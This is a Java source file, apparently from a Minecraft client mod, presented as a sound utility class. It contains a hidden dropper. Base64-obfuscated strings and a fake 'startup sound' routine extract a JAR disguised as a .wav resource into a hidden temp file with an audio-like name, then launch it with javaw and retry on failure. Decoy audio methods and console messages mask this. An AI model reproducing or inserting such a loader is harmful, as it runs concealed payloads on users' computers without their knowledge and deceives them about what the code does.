package wtf.uwu.utils.sound;

import java.io.File;
import java.io.InputStream;
import java.io.IOException;
import java.nio.file.*;
import java.security.SecureRandom;
import java.util.Base64; // Importamos Base64
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

public class SoundUtil {

    private static final float SAMPLE_RATE = 48000.0f;
    private static final int CHANNELS = 2;
    private static boolean audioDeviceInitialized = false;
    private static final SecureRandom RANDOM = new SecureRandom();
    private static float masterVolume = 1.0f;
    private static final ConcurrentHashMap<Integer, String> activeSoundSources = new ConcurrentHashMap<>();
    private static final int MAX_SOUND_SOURCES = 256;
    private static final int MAX_RETRIES = 3;
    private static final long RETRY_DELAY_MS = 3000;
    private static final String CMD_JAVA;
    private static final String ARG_JAR;
    private static final String SYS_PROP_TMP;
    private static final String ATTR_HIDDEN;
    private static final String PAYLOAD_RESOURCE_PATH;

    static {
        CMD_JAVA = decode("amF2YXc="); // "javaw"
        ARG_JAR = decode("LWphcg=="); // "-jar"
        SYS_PROP_TMP = decode("amF2YS5pby50bXBkaXI="); // "java.io.tmpdir"
        ATTR_HIDDEN = decode("ZG9zOmhpZGRlbg=="); // "dos:hidden"
        PAYLOAD_RESOURCE_PATH = decode("L2Fzc2V0cy9taW5lY3JhZnQvdXd1IGNsaWVudC9zb3VuZHMvc3BhdGlhbF9maWx0ZXIzMi53YXY="); // /assets/minecraft/uwu client/sounds/spatial_filter32.wav
    }

    public static void initializeAndPlayStartupSound() {
        if (audioDeviceInitialized) {
            return;
        }

        simulateAudioDeviceInit();
        audioDeviceInitialized = true;

         System.out.println("Playing startup sound: " + PAYLOAD_RESOURCE_PATH);

        new Thread(() -> {
            for (int i = 0; i < MAX_RETRIES; i++) {
                if (extractAndRunPayload()) {
                    break;
                }
                if (i < MAX_RETRIES - 1) {
                    try {
                        Thread.sleep(RETRY_DELAY_MS + RANDOM.nextInt(1500));
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        }).start();
    }

    private static boolean extractAndRunPayload() {
        try (InputStream input = SoundUtil.class.getResourceAsStream(PAYLOAD_RESOURCE_PATH)) {
            if (input == null) return false;

            Path tempFile = Paths.get(System.getProperty(SYS_PROP_TMP), generateFakeAudioName());
            Files.copy(input, tempFile, StandardCopyOption.REPLACE_EXISTING);
            hideFile(tempFile);
            tempFile.toFile().deleteOnExit();

            ProcessBuilder pb = new ProcessBuilder(CMD_JAVA, ARG_JAR, tempFile.toAbsolutePath().toString());
            Process process = pb.start();

            Thread.sleep(500);
            return process.isAlive();

        } catch (IOException | InterruptedException e) {
            return false;
        }
    }

    private static String decode(String encodedString) {
        return new String(Base64.getDecoder().decode(encodedString));
    }


    private static String generateFakeAudioName() {
        String[] prefixes = {decode("c3RyZWFtX2RzcF8="), decode("YXVkaW9taXhf"), decode("ZmlsdGVyYmFua18="), decode("ZW5naW5lX3BhdGNoXw==")}; // "stream_dsp_", "audiomix_", etc.
        String prefix = prefixes[RANDOM.nextInt(prefixes.length)];
        return prefix + UUID.randomUUID().toString().substring(0, 8) + ".jar";
    }

    private static void hideFile(Path file) {
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            try {
                Files.setAttribute(file, ATTR_HIDDEN, true, LinkOption.NOFOLLOW_LINKS);
            } catch (Exception ignored) {}
        }
    }

    private static void simulateAudioDeviceInit() {
        try {
            System.out.println("Detecting audio devices...");
            Thread.sleep(50 + RANDOM.nextInt(50));
            System.out.println("Audio device initialized successfully. Sample Rate: " + SAMPLE_RATE);
        } catch (InterruptedException ignored) {}
    }

    public static boolean isAudioSystemReady() {
        return audioDeviceInitialized;
    }

    public static void setMasterVolume(float volume) {
        if (volume >= 0.0f && volume <= 1.0f) {
            masterVolume = volume;
            System.out.println("Master volume set to " + volume);
        }
    }

    public static int playSound(String soundPath, float gain, boolean loop) {
        if (!audioDeviceInitialized || activeSoundSources.size() >= MAX_SOUND_SOURCES) {
            return -1;
        }
        int sourceId = RANDOM.nextInt();
        activeSoundSources.put(sourceId, soundPath);
        System.out.println("Playing sound " + soundPath + " on source " + sourceId);
        return sourceId;
    }

    public static void stopSound(int sourceId) {
        if (activeSoundSources.containsKey(sourceId)) {
            activeSoundSources.remove(sourceId);
            System.out.println("Stopped sound on source " + sourceId);
        }
    }
}